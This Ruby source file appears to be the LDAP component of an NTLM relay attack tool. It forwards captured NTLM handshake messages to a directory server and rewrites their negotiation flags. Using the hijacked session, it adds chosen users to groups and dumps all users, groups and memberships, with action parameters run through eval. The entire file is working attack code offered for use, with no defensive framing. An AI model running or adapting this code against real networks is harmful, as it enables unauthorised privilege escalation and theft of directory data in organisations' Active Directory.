#encoding: ASCII-8BIT
require 'socket'

module ZFClient
  class Ldap
    def initialize (server,port)
      puts "LDAP CLIENT GO"
      @db = ZFdb::DB.new
      @s = TCPSocket.open(server,port)
    end
    
    def sendtype1(type1msg)
      w = Ldappkt.new
      w.Buildfirst
      @s.write(w.Buildpacket)
      @q, x = @s.recvfrom(2000)
      w.Buildsecond
      @s.write(w.Buildpacket)
      @q, x = @s.recvfrom(2000)
      #debug cut
      puts type1msg[12,4].unpack("H*")
      type1msg[12,4] = "\x97\x82\x08\xe2"
      #type1msg[12,4] = "\x97\x82\x08\xe2"
      #debug end
      w.BuildNTLM(1,type1msg)
      @s.write(w.Buildpacket)
      @q, x = @s.recvfrom(2000)
      ntlm = Ldappkt.ParseNTLM(@q)
      #debug cut
      puts ntlm[20,4].unpack("H*")
      ntlm[20,4] = "\x15\x82\x89\xe2"
      #ntlm[20,4] = "\x05\x82\x89\xe2"
      #debug end
      return ntlm
    end
    
    def sendtype3(type3msg, rawpkt, items=nil)
      w = Ldappkt.new
      w.BuildNTLM(3,type3msg)
      @s.write(w.Buildpacket)
      @q, x = @s.recvfrom(2000)
      begin
      w= Ldappkt.new
      w.FindBase
      @s.write(w.Buildpacket)
      @q, x = @s.recvfrom(2000)
      baseobj = w.ParseBaseDN(@q) #zfzf
      actions = @db.GetActionItems(items["aid"])
      actions.each do |act|
        if act[3] == 1 then #enum group
          group = (eval act[4])["group"]
          puts group
        elsif act[3] == 2 then #add user to group
          info = (eval act[4])
          w.FindDN(baseobj, info["user"],1)
          @s.write(w.Buildpacket)
          @q, x = @s.recvfrom(2000)
          userdn = w.ParseSearchResult(@q)
          w.FindDN(baseobj, info["group"],2)
          @s.write(w.Buildpacket)
          @q, x = @s.recvfrom(2000)
          groupdn = w.ParseSearchResult(@q)
          w.AddUserToG(userdn,groupdn)
          @s.write(w.Buildpacket)
          @q, x = @s.recvfrom(2000)
        elsif act[3] == 10 then #pullallusersandgroups
          w.PullAllUsersAndGroups(baseobj)
          @s.write(w.Buildpacket)
          w.ParseLoop(@s)
        end
      end
      
      rescue
        puts $!
      end
    end
    
    
  end
  
  class Ldappkt
    attr_accessor :msgid
    def initialize(msg="")
      @msgid = 1
      if !(msg=="") then
        
        
      end
    end
    def self.ParseNTLM(msg)
      pos = msg.index(/\x4e\x54\x4c\x4d\x53\x53\x50/)
      if msg[pos-3] == "\x82" then len = msg[pos-2,2].unpack("n")[0]
      else len = msg[pos-1,1].unpack("C")[0] 
      end
      return msg[pos,len]
    end
    
    def Buildfirst()
      @reqcode = "\x63"
      build4 = "\x73\x75\x70\x70\x6f\x72\x74\x65\x64\x43\x61\x70\x61\x62\x69\x6c\x69\x74\x69\x65\x73"
      build3 = "\x04" + [build4.length].pack("C") + build4
      build2 = "\x00" + [build3.length].pack("C") + build3
      build = "\x04\x00" + #
              "\x0a\x01\x00" + #
              "\x0a\x01\x00" + #
              "\x02\x01\x00" + #
              "\x02\x01\x78" + #time limit
              "\x01\x01\x00" + #types only false
              "\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73" + # filter objectclass
              "\x30\x84" + #
              "\x00\x00" + build2        
      @body = "\x84\x00\x00" + [build.length].pack("n") + build
    end
    
    def Buildsecond()
      @msgid = 2
      @reqcode = "\x63"
     build4 = "\x73\x75\x70\x70\x6f\x72\x74\x65\x64\x53\x41\x53\x4c\x4d\x65\x63\x68\x61\x6e\x69\x73\x6d\x73"
     #build2 = "\x00\x19\x04" + [build3.length].pack("C") + build3
     build3 = "\x04\x82" + [build4.length].pack("n") + build4
     build2 = "\x00\x19" + build3
      build = "\x04\x00" + #
              "\x0a\x01\x00" + #
              "\x0a\x01\x00" + #
              "\x02\x01\x00" + #
              "\x02\x01\x78" + #
              "\x01\x01\x00" + #
              "\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73" + # filter objectclass
              "\x30\x84" + #
              "\x00\x00" + build2        
      @body = "\x84\x00\x00" + [build.length].pack("n") + build
    end
    def BuildNTLM(type, msg)
      @msgid = 3
      @reqcode = "\x60"
      
      
      build2 = "\x04\x0a" + "\x47\x53\x53\x2d\x53\x50\x4e\x45\x47\x4f" + "\x04\x82" + [msg.length].pack("n") + msg 
      
      build = "\x02\x01" + 
              "\x03\x04" + 
              "\x00" + 
              "\xa3\x84\x00\x00" + [build2.length].pack("n") + build2
      @body = "\x84\x00\x00" + [build.length].pack("n") + build
    end
    def FindBase()
      # lazy again. here's the raw packet. Runing short on time.
      @msgid = 4
      @reqcode = "\x63"
      @body = "\x39\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x19\x04\x17\x72\x6f\x6f\x74\x44\x6f\x6d\x61\x69\x6e\x4e\x61\x6d\x69\x6e\x67\x43\x6f\x6e\x74\x65\x78\x74"
    end
    def FindDN(baseobj, name, type=1)
      @reqcode = "\x63"
      filter1desc = "objectclass"
      if type == 1 then 
      filter1value = "user"
      elsif type ==2  then
        filter1value= "group"
        end 
      filter2desc = "sAMAccountName"
      filter2value = name
      
      filter1b = "\x04" + [filter1desc.length].pack("C") + filter1desc + "\x04" + [filter1value.length].pack("C") + filter1value 
      filter1 = "\xa3" + [filter1b.length].pack("C") + filter1b
      filter2b = "\x04" + [filter2desc.length].pack("C") + filter2desc + "\x04" + [filter2value.length].pack("C") + filter2value
      filter2 = "\xa3" + [filter2b.length].pack("C") + filter1b
      attributes = "dn"
      build = "\x04\x82" + [attributes.length].pack("n") + attributes
      build = "\x30" + [build.length].pack("C") + build
      filter = "\xa3\x82" + [filter1b.length].pack("n") + filter1b + "\xa3\x82" + [filter2b.length].pack("n") + filter2b  
      build = "\x04\x82" + [baseobj.length].pack("n") + baseobj + "\x0a\x01\x02\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00" + "\xa0" + 
              [filter.length].pack("C") + filter + build
      @body =  "\x82" + [build.length].pack("n") + build
    end
    def PullAllUsersAndGroups(baseobj, attributes=nil)
      @reqcode = "\x63"
      filter1desc = "objectclass"
      filter1value = "user"
      filter2desc = "objectclass"
      filter2value = "group"
      
      filter1b = "\x04" + [filter1desc.length].pack("C") + filter1desc + "\x04" + [filter1value.length].pack("C") + filter1value 
      filter2b = "\x04" + [filter2desc.length].pack("C") + filter2desc + "\x04" + [filter2value.length].pack("C") + filter2value
      attributes = ["sAMAccountName","member","memberOf","objectGUID"]
      build = ""
      attributes.each do |woof|
        build = build + "\x04" + [woof.length].pack("C") + woof
      end
      build = "\x30" + #attribute list
              "\x82" + [build.length].pack("n") + build
      filter = "\xa3" + #item
                "\x82" + [filter1b.length].pack("n") + filter1b + "\xa3" + "\x82" + [filter2b.length].pack("n") + filter2b   
      build = "\x04" + "\x82" + [baseobj.length].pack("n") + baseobj + 
              "\x0a\x01" + "\x02" + "\x0a\x01" + "\x00" + "\x02\x01" + "\x00" + "\x02\x01" + "\x00" + "\x01\x01" + "\x00" + 
              #"\xa0" + #AND
              "\xa1" + #OR 
              #"\xa3" + #item 
              #"\xa2" + #NOT
              [filter.length].pack("C") + filter + build
      @body =  "\x82" + [build.length].pack("n") + build
    end
    def ParseSearchResult(q)
      #TODO actual parsing instead of gheto parsing
      pos = q.index(/\x43\x4e\x3d/)
      len = q[pos-1,1].unpack("C")
      return q[pos,len[0]]
    end
    def ParseLoop(s)
      notdone = true
      while (notdone)
        cpos = pos = 0
        q = ""
        while (d = s.recvfrom(2000))
          q = q + d[0]
          if (d[0].length<2000) then break end
        end
        while (pos < q.length)
          len = q[pos+2,4].unpack("N")[0]
          cpos=pos
          pos = pos + 6 + len
          if (q[cpos+9] == "\x64") then
            #puts "pos: " + pos.to_s + " / len: " + len.to_s
            ilen = q[cpos+16].unpack("C")[0]
            #puts "DN is " + q[cpos+17,ilen]
            cpos = cpos+17+ilen+6
            while cpos < pos-1 #each attribute in list
              alen = q[cpos+2,4].unpack("N")[0]
              apos = cpos+6
              cpos = cpos+alen+6
              tlen = q[apos+1,1].unpack("C")[0]
              #puts "  " + q[apos+2,tlen]
              apos = apos + tlen + 8
              while apos < cpos
                ilen = q[apos+1,1].unpack("C")[0]
                #puts "   - " + q[apos+2,ilen]
                apos = apos+2+ilen
              end
              
              
              
            end
          elsif (q[cpos+9] == "\x65") then
            notdone = false
            puts "DONE"  
          end
          
        end
        q = nil
      end
    end
    def ParseBaseDN(q)
      #TODO ACTUAL PARSING FOR FUCKS SAKE
      pos = q.index(/\x44\x43\x3d/)
      len = q[pos-1,1].unpack("C")
      return q[pos,len[0]]
    end
    def AddUserToG(userdn,groupdn)
      @reqcode = "\x66" 
      add = "member"
      @msgid = 4
      build = "\x04" + "\x82"+[userdn.length].pack("n") + userdn
      build = "\x04\x82" + [add.length].pack("n") + add + 
              "\x31\x82" + [build.length].pack("n") + build
      build = "\x0a\x01\x00" + "\x30" + "\x82" + [build.length].pack("n") + build
      build = "\x30" + "\x82" + [build.length].pack("n") + build
      build = "\x04\x82" + [groupdn.length].pack("n") + groupdn + "\x30" + "\x82" + [build.length].pack("n") + build
      @body = "\x82" + [build.length].pack("n") + build
    end
    def Buildpacket()
      build = "\x02\x01" + [@msgid].pack("C") + @reqcode + @body
      packet = "\x30\x82" + [build.length].pack("n") + build
      return packet
    end
#to be deleted - not sure why it exists
#    def Buildpacket2()
#      build = "\x02\x01" + [@msgid].pack("C") + @reqcode + @body
#      packet = "\x30\x82" + [build.length].pack("n") + build
#      return packet
#    end
  end
  
end
